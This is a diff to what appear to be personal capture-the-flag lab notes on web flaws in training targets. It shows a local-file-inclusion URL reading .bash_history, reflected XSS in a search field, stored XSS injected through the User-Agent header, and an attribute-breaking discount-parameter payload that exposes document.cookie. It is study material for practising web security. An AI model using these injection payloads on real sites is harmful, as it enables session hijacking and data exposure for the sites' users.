@@ -52,4 +52,48 @@ To do LFI there may be another parameter instead of id
 
 http://10.10.216.223:5000/api/v1/resources/books?show=.bash_history
 
+____________________________________________________________________________________________________________________________________________
+
+http://nahamstore.thm/search?q=alert(1)
+
+<h3 class="text-center">Search Results For "alert(1)"</h3>
+
+Cannot use <script> because it makes filter &ltscript&gt
+--------------------------------------------------------
+<h3 class="text-center">Search Results For ""><script>alert(1)</script>"</h3>
+
+Use payload =>  '; alert(1);'
+------------------------------
+<h3 class="text-center">Search Results For "'; alert(1);'"</h3>
+__________________________________________________________________________________________________________________________
+
+Whenever we make an order, User-Agent is reflected back to client, that means Stored XSS is valid.
+
+for example
+------------
+
+Order Id: 4
+Order Date: 03/03/2024 08:18:17
+User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+
+We can inject malicious javascript code ==>  User-Agent:<script>alert(1)</script>
+__________________________________________________________________________________________________________________________
+
+http://nahamstore.thm/product?id=2&added=1 (original)
+
+If you fill in the discount box and submit, you don't see what you write. (value is empty)
+
+<div style="margin-bottom:10px"><input placeholder="Discount Code" class="form-control" name="discount" value=""></div>  
+
+
+But if you change the url by adding discount parameter and it's value
+-----------------------------------------------------------------------
+
+http://nahamstore.thm/product?id=2&added=1&discount=1234
+
+<div style="margin-bottom:10px"><input placeholder="Discount Code" class="form-control" name="discount" value="1234"></div>
+
+http://nahamstore.thm/product?id=2&added=1&discount=1234"onmouseover=alert(document.cookie);//"
+  														---------------------------------------
+****When you put your mouse pointer over the box, you will get cookie****
 
